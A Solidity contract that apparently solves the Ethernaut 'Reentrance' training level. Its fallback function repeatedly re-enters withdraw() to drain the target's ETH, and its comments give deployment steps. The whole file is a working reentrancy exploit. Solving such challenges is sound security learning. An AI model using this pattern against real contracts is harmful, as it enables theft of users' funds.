/*
Tools needed for this level:
- Console
- Remix IDE

1.- Copy the Reentrace contract to Remix IDE. This is needed for being able to import the code 
    on this file. No need to deploy Reentrance.sol.
2.- Deploy this contract (ReentraceAttack.sol) passing Ethernaut's Reentrance contract address
    to the constructor and the amount of ETH which will be used for attacking the Reentrance
    contract (in this case is 0.001 ETH).
3.- Execute the attack function.
4.- Verify you have stolen all the funds:
        await web3.eth.getBalance(instance)
*/

// SPDX-License-Identifier: MsIT
pragma solidity ^0.6.0;

import './Reentrance.sol';

contract RentranceAttack {
	Reentrance reentrance;

	// Equal to 1 Finney
	uint256 public amount = 0.001 ether;

	constructor(address payable reentranceAddress) public payable {
		reentrance = Reentrance(reentranceAddress);
	}

	function attack() public {
		// donate any amount of ETH for being able to pass the first
		// requirement of the withdraw function on Ethernaut's Reentrance:
		//     if(balances[msg.sender] >= _amount)
		reentrance.donate{value: amount}(address(this));

		// Execute the withdraw function
		reentrance.withdraw(amount);
	}

	// This fallback function makes the re-entrancy attack by re-executing the
	// withdraw() function on Reentrance contract as long as its balance is
	// greater than zero.
	receive() external payable {
		if (address(reentrance).balance > 0) {
			reentrance.withdraw(amount);
		}
	}
}
